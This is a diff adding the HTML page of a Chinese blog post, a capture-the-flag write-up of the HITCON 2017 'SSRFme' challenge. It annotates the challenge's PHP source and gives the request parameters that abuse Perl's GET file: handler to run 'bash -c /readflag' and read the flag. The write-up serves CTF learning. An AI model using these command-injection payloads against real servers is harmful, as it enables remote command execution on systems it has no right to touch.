@@ -1,0 +1,191 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>[HITCON 2017]SSRFme - Dongq‘s blog</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="[HITCON 2017]SSRFme12345678910111213141516171819122.224.128.194 &amp;lt;?php    if (isset($_SERVER[&amp;#x2,"> 
+    <meta name="author" content="Dongq"> 
+    <link rel="alternative" href="atom.xml" title="Dongq‘s blog" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 5.0.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">Dongq‘s blog</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://yoursite.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">[HITCON 2017]SSRFme</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">[HITCON 2017]SSRFme</h1>
+        <div class="stuff">
+            <span>六月 29, 2020</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <h2 id="HITCON-2017-SSRFme"><a href="#HITCON-2017-SSRFme" class="headerlink" title="[HITCON 2017]SSRFme"></a>[HITCON 2017]SSRFme</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">122.224</span><span class="number">.128</span><span class="number">.194</span> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">        $http_x_headers = explode(<span class="string">&#x27;,&#x27;</span>, $_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);</span><br><span class="line">        $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = $http_x_headers[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> $_SERVER[<span class="string">&quot;REMOTE_ADDR&quot;</span>];</span><br><span class="line"></span><br><span class="line">    $sandbox = <span class="string">&quot;sandbox/&quot;</span> . md5(<span class="string">&quot;orange&quot;</span> . $_SERVER[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line"></span><br><span class="line">        $data = shell_exec(<span class="string">&quot;GET &quot;</span> . escapeshellarg($_GET[<span class="string">&quot;url&quot;</span>]));</span><br><span class="line">    $info = pathinfo($_GET[<span class="string">&quot;filename&quot;</span>]);</span><br><span class="line">    $dir  = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>, basename($info[<span class="string">&quot;dirname&quot;</span>]));</span><br><span class="line">    @mkdir($dir);</span><br><span class="line">    @chdir($dir);</span><br><span class="line">    @file_put_contents(basename($info[<span class="string">&quot;basename&quot;</span>]), $data);</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+
+<p>explode函数将字符串打散为数组</p>
+<p>escapeshellarg 给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数</p>
+<p>首先获取用户ip地址并输出</p>
+<p>然后把orange和ip地址放在一起md5加密，赋值给$sandbox</p>
+<p>$data为写入文件的内容</p>
+<p>$info为写入文件的文件名</p>
+<p>$dir为返回路径中的文件名部分</p>
+<p>考点:perl的get任意命令执行漏洞</p>
+<p>通过控制open命令中的path变量达到命令执行的目的</p>
+<p>先通过?url=../../../../../&amp;filename=aaa</p>
+<p>然后查看/sandbox/md5/aaa</p>
+<p>查看文件目录</p>
+<p>发现readflag，需要管理员权限执行</p>
+<p>先创建一个名为需要执行的命令的文件，并且以|结尾<br>?url=&amp;filename=bash -c /readflag|</p>
+<p>然后进行利用<br>?url=file:bash -c /readflag&amp;filename=www</p>
+<p>最后访问/sandbox/md5/www</p>
+<p>得到flag</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='false'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
